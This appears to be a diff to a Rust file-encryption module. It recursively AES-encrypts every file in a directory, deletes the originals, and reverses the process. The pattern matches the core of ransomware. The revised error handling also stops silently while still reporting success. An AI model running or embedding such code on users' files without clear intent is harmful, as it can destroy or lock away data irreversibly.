@@ -7,7 +7,7 @@ use aes::Aes256;
 use block_modes::{BlockMode, Cbc};
 use block_modes::block_padding::Pkcs7;
 use std::fs::File;
-use std::path::{Path, PathBuf};
+use std::path::Path;
 use std::fs;
 use std::io::{Read, Write};
 use std::error::Error;
@@ -66,7 +66,7 @@ fn get_files(directory_path: &str) -> Vec<String> {
         if file_path.is_file() {
             file_list.push(file_path.to_string_lossy().to_string());
         } else if file_path.is_dir() {
-            let sub_files = get_files(&file_path.to_string_lossy().to_string());
+            let sub_files = get_files(file_path.to_string_lossy().as_ref());
             file_list.extend(sub_files);
         }
     }
@@ -78,8 +78,8 @@ pub fn encrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
     let directory = get_files(directory_path);
     for mut file in directory {
         let encrypted_file_path = file.as_mut().to_owned() + ".enc";
-        encrypt_file(&file, &encrypted_file_path)?;
-        fs::remove_file(file).unwrap();
+        if encrypt_file(&file, &encrypted_file_path).is_err() { break; }
+        if fs::remove_file(file).is_err() { break; }
     }
     Ok(())
 }
@@ -87,8 +87,11 @@ pub fn encrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
 pub fn decrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
     let directory = get_files(directory_path);
     for mut file in directory {
-        let encrypted_file_path = file.as_mut().to_owned() + ".enc";
-        decrypt_file(&file, &encrypted_file_path)?;
+        let mut file_path = file.as_mut().to_owned();
+        let ext_index = file_path.rfind('.').unwrap();
+        file_path.truncate(ext_index);
+        if decrypt_file(&file, &file_path).is_err() { break; }
+        if fs::remove_file(file).is_err() { break; }
     }
     Ok(())
 }
